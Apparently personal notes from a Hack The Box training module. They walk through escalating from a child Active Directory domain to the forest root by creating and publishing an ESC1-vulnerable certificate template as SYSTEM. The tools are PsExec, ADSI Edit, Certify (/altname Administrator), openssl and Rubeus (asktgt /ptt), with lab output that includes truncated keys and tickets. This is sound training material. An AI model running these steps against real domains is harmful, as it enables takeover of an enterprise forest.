

## Using CLI






### Using GUI


##### GUI Usage

When using connect to make sure to connect to the configuration naming context

![[3 Abusing ADCS-20260127201405162.webp]]



One can view these objects by accessing `ADSI.msc` and connecting to the Configuration Naming Context (NC).

```
Configuration > Services > Public Key Services
```

![ADSI Edit window showing CN=Public Key Services under CN=Services for DC01.INLANEFREIGHT.AD. It includes containers like CN=AIA, CN=Certificate Templates, and CN=Certification Authorities.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/dc01_configuration_naming_context.png)

The `Certificate Templates` container stores templates as `pKICertificateTemplate` objects that can be published to an ADCS CA. The Certificate Templates container is stored in Active Directory under the following location: `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=INLANEFREIGHT,DC=AD`, where `DC=INLANEFREIGHT, DC=AD` is the DN of the forest root domain.

![ADSI Edit window showing CN=Certificate Templates under CN=Public Key Services for DC01.INLANEFREIGHT.AD. It lists templates like CN=Administrator, CN=CA, and CN=ClientAuth.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/dc01_certificate_templates.png)

The `Enrollment Services` container contains one pKIEnrollmentService object per CA. These objects enumerate the templates that have been `published` to the CA through their `certificateTemplates` property. The Enrollment Services container is stored in Active Directory under the following location: `CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=INLANEFREIGHT,DC=AD`, where `DC=INLANEFREIGHT, DC=AD` is the DN of the forest root domain.

![ADSI Edit window showing CN=Enrollment Services under CN=Public Key Services for DC01.INLANEFREIGHT.AD. It lists CN=INLANEFREIGHT-DC01-CA with class pKIEnrollmentService.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/dc01_enrollment_services.png)

Since the `Configuration Naming Context (NC)` is replicated across all domain controllers within the forest, we can alter these objects from a child domain as a `SYSTEM` user in its local replica. With the ability to write to these objects, it is possible to create our own `Certificate Template` which is vulnerable to ESC1 and then publish it to the ADCS CA server.


#### Simplification of ADCS Attack:

1. Add a new vulnerable `Certificate Template` inside the `Certificate Templates` container as a `pKICertificateTemplate` object.
2. Give the `Administrator` user of the child domain `Full Control` rights over the created Certificate Template.
3. Publish the created template to the CA server by modifying the `pKIEnrollmentService` object of the CA inside the `Enrollment Services` container.
4. After the Configuration NC is replicated back to the parent domain, request the certificate for `root\Administrator` from the child domain.


#### To make a Certificate Template Vulnerable to ESC1:

1. Right-click on the `User` template.
2. Select `Duplicate Template`. This action will open a prompt with the properties of the new template.
3. Set the `Subject Name` option to `Supply in the request`. This configuration allows for dynamic specification of the subject name during the certificate request process, potentially introducing the ESC1 vulnerability.
4. Upon creating the certificate, it's **crucial to acknowledge** that the corresponding changes are also mirrored in the `Configuration Naming Context (NC)` of Active Directory. This **underscores** the inherent synchronization mechanism within Active Directory, where modifications made in the `Certificate Templates` are also propagated to the `Certificate Templates` container in Configuration Naming Context (NC).




## Performing the Attack

The first step involves adding a `Certificate Template` vulnerable to `ESC1` inside the `Certificate Templates` container. To do this we can open Microsoft Management Console (`MMC`) as a SYSTEM user.

To access `Certificate Templates` within the `MMC`, follow these steps:

1. Open `mmc` as `SYSTEM` using PowerShell and Click on `File` in the menu bar.
2. Select `Add/Remove Snap-in`.
3. Click `Add` to add the `Certificate Templates` snap-in.
4. Click `OK` to confirm and open `Certificate Templates`.

#### Use Psexec to Open MMC as a SYSTEM user

  Abusing ADCS

```powershell-session
PS C:\Tools\> .\PsExec -s -i powershell
PS C:\Windows\system32> mmc
```

Certificate Templates are stored as `pKICertificateTemplate` objects within the `Certificate Templates` container in the `Configuration Naming Context (NC)`. Adding a new template here will create a corresponding `pKICertificateTemplate` object in the `Configuration NC`, which will be replicated back to the root DC.

---

We can duplicate an existing template and make it vulnerable to ESC1. To do this, Right click on `User` template and click `Duplicate Template`, a new prompt with the `Properties` of New Template will be opened.

![Certificate Templates console showing a list of templates, including "User" with schema version 3.1. The context menu for "User" is open with options like "Duplicate Template" and "Properties."](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/dc02_duplicate_template.png)

Under the `Subject Name` option, select `Supply in the request` to allow for dynamic specification of the subject name during the certificate request process. Then, navigate to the `Security tab` to configure access control settings. Here, grant the `Administrator` of the child domain `Full Control` rights. This ensures that the `DEV\Administrator` has complete control over the certificate `request` and `issuance` process, facilitating efficient management of certificate in parent domain.

![Certificate Templates console showing a list of templates. The "Properties of New Template" window is open, with the "Subject Name" tab selected and "Supply in the request" option chosen.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/dc02_supply_request_1.png)

![Certificate Templates console showing a list of templates. The "Properties of New Template" window is open to the "Security" tab, displaying permissions for "Administrator" with options like "Full Control," "Read," and "Write" checked under "Allow."](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/dc02_administrator_fullcontrol_1.png)

Upon creating the certificate, it's crucial to acknowledge that the corresponding changes are also mirrored in the `Configuration Naming Context (NC)` of Active Directory. This underscores the inherent synchronization mechanism within Active Directory, where modifications made in the `Certificate Templates` are also propagated to the `Certificate Templates` container in Configuration Naming Context (NC).

Note: Use Psexec to open Configuration Naming Context (NC) using `adsiedit.msc` as a SYSTEM

![ADSI Edit window showing CN=Certificate Templates under CN=Public Key Services for DC01.INLANEFREIGHT.AD. It includes CN=Copy of User with class pKICertificateTemplate.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/dc02_replicated_to_nc_1.png)

To publish the certificate to the Certificate Authority (CA), it is imperative to add the certificate to the `pKIEnrollmentService` object within the `Enrollment Services` container. However, upon inspecting the `Access Control List (ACL)` for the `pKIEnrollmentService` object, it becomes evident that the `SYSTEM` account does not possess the necessary access permissions to modify this object.

![ADSI Edit window showing CN=INLANEFREIGHT-DC01-CA under CN=Enrollment Services. The properties window is open to the "Security" tab, listing groups like "Authenticated Users" and "Domain Admins" with permissions options.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/dc02_acl_pkiobject.png)

To grant ourselves the necessary control over the `pKIEnrollmentService` object, we can leverage the permissions inheritance feature `enabled` for the `Public Key Services` container. By accessing the security descriptor for the `Public Key Services` container, we can modify the permissions of the `SYSTEM` user to apply to `This object and all descendant objects`. This action ensures that the permissions granted to the `SYSTEM` user cascade down to the pKIEnrollmentService object and all its descendant objects within the container.

![ADSI Edit window showing CN=Public Key Services. The "Advanced Security Settings" window lists permissions, including "SYSTEM" with "Full control" for "This object and all descendants." Owner is "Enterprise Admins."](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/dc02_system_fullcontrol.png)

Now that the necessary permissions have been configured, we can proceed to edit the `pKIEnrollmentService` object of the `Certificate Authority (CA)`. Within this object, we will add the created certificate template named `Copy of User` to the `certificateTemplates` attribute. By including the certificate template in this attribute, we enable the CA to issue certificates based on the specified template to users or devices within the domain.

![[3 Abusing ADCS-20260127232541306.webp|819]]

![ADSI Edit window showing CN=INLANEFREIGHT-DC01-CA under CN=Enrollment Services. The "Multi-valued String Editor" is open for certificateTemplates, with "Copy of User" being added to values like "Administrator" and "DomainController."](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/dc02_edit_pkienrollment_2.png)

Upon successfully adding the certificate to the `pKIEnrollmentService` object, the corresponding certificate template will be officially `published`. This means that the template is now available for use and can be accessed within the parent domain.


![Certificate Templates console showing a list of templates, including "Copy of User" with schema version 2. The "Actions" pane displays options for "Copy of User."](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/dc01_certificate_published.png)

Now that the `Copy of User` certificate template has been successfully published in the Certification Authority (CA), we can request certificates from the `DEV\Administrator` user utilizing `Certify`. During the certificate creation process, because of selecting `Supply in the request` as the `Subject Name` option, we gain the flexibility to specify any desired name for the certificate request. For example, by utilizing the `/altname` argument in `Certify`, we have the ability to request certificates for users such as `inlanefreight\administrator` or a standard `domain user`. This parameter allows for the inclusion of alternative names in the certificate request, thereby facilitating the issuance of certificates tailored to specific user identities within the domain infrastructure.

#### Request the Created Certificate

  Abusing ADCS

```powershell-session
PS C:\Tools> .\Certify.exe request /ca:inlanefreight.ad\INLANEFREIGHT-DC01-CA /domain:inlanefreight.ad /template:"Copy of User" /altname:INLANEFREIGHT\Administrator

_____          _   _  __
/ ____|        | | (_)/ _|
| |     ___ _ __| |_ _| |_ _   _
| |    / _ \ '__| __| |  _| | | |
| |___|  __/ |  | |_| | | | |_| |
\_____\___|_|   \__|_|_|  \__, |
						  __/ |
						|___./

v1.0.0

[*] Action: Request a Certificates
[*] Current user context    : DEV\Administrator
[*] No subject name specified, using current context as subject.
[*] Template                : Copy of User
[*] Subject                 : CN=Administrator, CN=Users, DC=dev, DC=INLANEFREIGHT, DC=AD
[*] AltName                 : INLANEFREIGHT\Administrator
[*] Certificate Authority   : inlanefreight.ad\INLANEFREIGHT-DC01-CA
[*] CA Response             : The certificate had been issued.
[*] Request ID              : 7
[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxpIQXSZERIPzw5X/LWzznXmP7R5BSnLB0sN5U0mldKw69DkK
1DU3a8G8hJzkMbubdgSzkEqi/1+ET6a44YG7GcPKG+76Jmp/mq1DF6qYGu5b3CNv
aYKZtay2aECibzLfZY4skhY8wOzNGDETsdSz7PmqqBVnJWV7+eTqyMvs2vuQYY9H
3K1m9CJVBEKIX2GIuRUjpcj1REvPm46CziZ7DOrg4+bhczAsHYxNkv4n4SGxqW9j
vTiNkVDFT4xiZ+Z0jourD0BuIzDzHQv454dkC7Qb3QmhcpyPzlphBnUywV7fHEdF
inMmlvlPniePTkvJ184EmieOrH3Kc3Lf6M2A5QIDAQABAoIBAQCT9k7fOh5wd2py
eRiV/rNgyi4m3/6CvRQUOrfzCdOSJqwfQ0oAak8LqmcQ4d9f942V2Vb708G1TLVI
<SNIP>
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGajCCBVKgAwIBAgITJgAAAAfO3Q5+NY8x+gAAAAAABzANBgkqhkiG9w0BAQsF
ADBTMRIwEAYKCZImiZPyLGQBGRYCQUQxHTAbBgoJkiaJk/IsZAEZFg1JTkxBTkVG
UkVJR0hUMR4wHAYDVQQDExVJTkxBTkVGUkVJR0hULURDMDEtQ0EwHhcNMjQwMzE2
MjMzOTA3WhcNMjUwMzE2MjMzOTA3WjBwMRIwEAYKCZImiZPyLGQBGRYCQUQxHTAb
BgoJkiaJk/IsZAEZFg1JTkxBTkVGUkVJR0hUMRMwEQYKCZImiZPyLGQBGRYDZGV2
MQ4wDAYDVQQDEwVVc2VyczEWMBQGA1UEAxMNQWRtaW5pc3RyYXRvcjCCASIwDQYJ
KoZIhvcNAQEBBQADggEPADCCAQoCggEBAMaSEF0mRESD88OV/y1s8515j+0eQUpy
<SNIP>
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Upon completion of the attack, the successful acquisition of a certificate will be confirmed. The generated `PEM` certificate will be displayed as base64. To convert the `PEM` certificate to the `PFX` format, we'll execute the command provided in the output of `Certify`. As a precautionary measure, we'll execute the following `sed` command beforehand to ensure proper formatting of the PEM file, mitigating any potential issues.

#### Use Regex to Format the Certificate

  Abusing ADCS

```shell-session
Hillside_1@htb[/htb]$ sed -i 's/\s\s\+/\n/g' cert.pem
```

Next, we can execute the `openssl` command mentioned in the output of Certify. When prompted for a password during the conversion process, it's advisable to press Enter without providing one, as per the instructions provided by Certify. This ensures a seamless conversion process and maintains the integrity of the certificate file.

#### Convert the Certificate to pfx Format

  Abusing ADCS

```shell-session
Hillside_1@htb[/htb]$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

With the certificate now available in a usable `PFX` format, which is supported by `Rubeus`, we can proceed to request a Kerberos `Ticket Granting Ticket (TGT)` for the user `Administrator` and authenticate using the certificate.

#### Request a TGT for the Administrator Account

  Abusing ADCS

```powershell-session
PS C:\Tools> PS C:\Tools> .\Rubeus.exe asktgt /domain:inlanefreight.ad /user:Administrator /certificate:cert.pfx /ptt

______        _
(_____ \      | |
_____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/
v2.2.3

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=dev, DC=INLANEFREIGHT, DC=AD
[*] Building AS-REQ (w/ PKINIT preauth) for: 'inlanefreight.ad\Administrator'
[*] Using domain controller: 172.16.210.99:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIGlDCCBpCgAwIBBaEDAgEWooIFmDCCBZRhggWQMIIFjKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSi
JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEGlubGFuZWZyZWlnaHQuYWSjggVIMIIFRKADAgESoQMCAQKiggU2
BIIFMoyn7q/ZcZLAD3HNJnHF2Fz/IsxomCWfKaVhuRQGt/LXCYqbAvrF/RkGoNQkK7tAQRIvQk1sIZVZ
HZWufaTGN9pfz0f42kqozX497GCVK7UrcA8fBoWkKgAV0B1WUnDOsJO+kYeFrsCOsGkg0MTa9uc5cJns
LCZ7k67wVqW3ASKBbwVyfPla9vw6op0EwvWqq8jQdHlGwPQAqNr47kUWsJFzCs+EEIoVwLX1XuJqMor+
NuWS3A/Z78if29Bi0yX1WolHWzzXqjocrH7cHcFSI0G4NfRua/IO/0hNXnAlTXSKrztcDmefFs7qRIJ4
wU9aCjL/CChlUicULZ8xJqIrxSMsEWXOY9Zp05zy+AjuGo0eS63rD4JSAFV3LEkIS7iyJZfJnccqDHYs
vFPlaZx9Y9gJZuaoGmWyefimxZs5AtuDculDqlqMK6pfHAfLtYauK5L6ikLKKQDcvK0FXaeEclkWq69z
+QajYE+Y/C0VkUJyDfRKzeTZ69mD4BXwG168CuZYmYYZYSu4VTm43NP06I4KP7zAj5MCTqgYEIYeX/ba
TDoRxrVkXlp5LrGcoKgLjjm5HUhASf+8Ro24E9X/hcErJwcz21o5VAnSXyuEqvDI+35V/jkFaMTzuQ7X
Z1t9v3JeOrGoxk8ouNdB5TmbTafaNgMqCxiMSXOcIQazkDJdY0WMWs3gSzDRzcgaVKA+FFv1Ff4S00nR
w1occUnQtSYjfseghAAaTsRIvqWTzuEfqiFZ+HrUE1fPC8Ydkh8pZxGzq+W/OdO6B0BwKvzK3gmmb2fo
<SNIP>

[+] Ticket successfully imported!
ServiceName              :  krbtgt/inlanefreight.ad
ServiceRealm             :  INLANEFREIGHT.AD
UserName                 :  Administrator
UserRealm                :  INLANEFREIGHT.AD
StartTime                :  3/16/2024 6:53:20 PM
EndTime                  :  3/17/2024 4:53:20 AM
RenewTill                :  3/23/2024 6:53:20 PM
Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
KeyType                  :  rc4_hmac
Base64(key)              :  Rba5Oq3iT7TUMqtNyYQSNA==
ASREP (key)              :  4651D86F64FF9D128F25777BFD417B08 
```



## Improvement:

Look for a way to use the pfx from linux with certipy

